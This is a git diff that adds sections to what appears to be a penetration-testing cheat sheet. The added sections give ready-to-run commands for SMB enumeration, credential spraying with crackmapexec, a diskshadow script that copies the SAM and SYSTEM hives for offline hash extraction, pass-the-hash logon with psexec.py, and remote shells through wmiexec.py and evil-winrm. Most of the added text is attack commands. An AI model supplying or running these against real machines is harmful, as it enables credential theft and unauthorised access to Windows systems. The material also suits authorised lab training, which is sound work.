@@ -281,6 +281,14 @@ Note that this tool output "COMPUTER.username.html" if the `-HTMLReport` is enab
 #### PrintSpoofer
 https://github.com/itm4n/PrintSpoofer
 
+## Windows and SMB information
+enum4linux-ng is an enumeration tool for Windows and SMB information.
+[enum4linux-ng](https://github.com/cddmp/enum4linux-ng)
+
+```
+enum4linux-ng  -u $User -p $Password $IP
+```
+
 ## Linux Privilege Escalation
 ### LinPEAS
 LinePEAS is a script which detect the possible path to escalate privilege on Linux etc...
@@ -927,6 +935,13 @@ We may access the smb server by using smbclient. For example,
 ```shell
 smbclient //$IP/general
 ```
+
+### Test auhtneitcation via SMB
+Test authentication via SMB protocol
+```
+crackmapexec smb $IP -u $User  -p $Password --domain $Domain
+```
+
 ## mount
 Mount the Windows directory via CIFS by using mount command.
 The advantage is that we can run the command, such as viewing a file, on the linux platform. 
@@ -963,6 +978,52 @@ Invoke-WebRequest -Uri http://example.com/file.zip -OutFile C:\path\to\save\file
 iwr http://example.com/file.zip -OutFile C:\path\to\save\file.zip
 ```
 
+### Check privilege
+```
+whoami /priv
+```
+
+### Privilege escalation for SeBackupPrivilege / SeRestorePrivilege
+In general, we cannot read the system file, such as SAM and SYSTEM.
+However, these privileges privide the bypass to copy the files for backup by using diskshadow.
+
+For example, we implements the script.
+```powershell
+set context persistent nowriters
+set metadata "C:\TempShadow\mydrive.cab"
+
+begin backup
+add volume c: alPias mydrive
+create
+expose %mydrive% z:
+end backup
+
+```
+
+Run this script on Powershell
+```
+diskshadow /s script
+```
+
+After diskshadow, the backup copy script is implemented as follows:
+[BackupCopy.ps1](tools/BackupCopy/BackupCopy.ps1)
+
+Finally, run BackupCopy.ps1.
+```
+powershell -File BackupCopy.ps1 -Source "Z:\Windows\System32\Config\SYSTEM" -Destination "C:\TempShadow\SYSTEM.copy"
+
+powershell -File BackupCopy.ps1 -Source "Z:\Windows\System32\Config\SAM" -Destination "C:\TempShadow\SAM.copy"
+```
+
+## Pass-the-Hash Attack
+Windows sends the NTLM Hash instead of plain password.
+
+We don't have to know the plain password to logon.
+```
+psexec.py -hashes :$Hash $User@$IP
+```
+Our best friend, called ChatGPT, said that wmiexec.py, Evil-WinRM, crackmapxec can also logon by using NTLM hash.
+
 
 # Python
 ## Run HTTP Server
@@ -976,11 +1037,16 @@ python -m SimpleHTTPServer <port>
 ```
 
 ## Remote Access
+### wmiexec.py
 [wmiexec.py](https://github.com/fortra/impacket/blob/master/examples/wmiexec.py)
 ```
 wmiexec.py $Domain/$User:$Password@$IP
 ```
 
+### evil-winrm
+```
+evil-winrm -i $IP -u $User -p $Password
+```
 
 
 ## Run system command by using dynamic import
